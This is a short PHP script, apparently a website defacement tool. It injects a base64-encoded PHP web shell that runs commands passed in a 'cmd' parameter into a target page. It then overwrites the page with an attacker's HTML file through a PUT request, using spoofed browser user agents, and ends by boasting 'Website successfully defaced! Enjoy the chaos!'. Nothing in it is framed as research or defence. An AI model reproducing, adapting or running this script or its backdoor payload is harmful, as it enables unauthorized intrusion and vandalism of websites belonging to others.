<?php

$targetUrl = "http://example.com/target-page.php";
$htmlFilePath = "cazzy.html";
$defaceHtml = file_get_contents($htmlFilePath);

$backdoorCode = '<?php eval($_GET["cmd"]); ?>';
$injectionUrl = $targetUrl . "?cmd=" . urlencode(base64_encode($backdoorCode));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $injectionUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"); 
$response = curl_exec($ch);
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $targetUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
curl_setopt($ch, CURLOPT_POSTFIELDS, $defaceHtml);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.7.1000 Chrome/30.0.1599.101 Safari/537.36"); 
$response = curl_exec($ch);
curl_close($ch);

echo "Website successfully defaced! Enjoy the chaos!";
?>
